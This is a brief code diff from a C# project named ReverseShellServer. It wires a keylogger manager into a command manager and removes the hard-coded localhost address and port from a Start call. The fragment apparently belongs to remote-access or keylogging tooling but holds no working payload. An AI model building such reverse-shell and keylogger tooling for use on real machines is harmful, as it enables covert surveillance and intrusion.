@@ -30,7 +30,7 @@ namespace ReverseShellServer
             manager.commandsManager.PassKeyloggerManagerInstance(keyLoggerManager);
 
             // Start the processing in a new thread as a task
-            var mainTask = new Task(() => manager.Start("127.0.0.1", 1111, 3000));
+            var mainTask = new Task(() => manager.Start());
             mainTask.Start();
         }
 
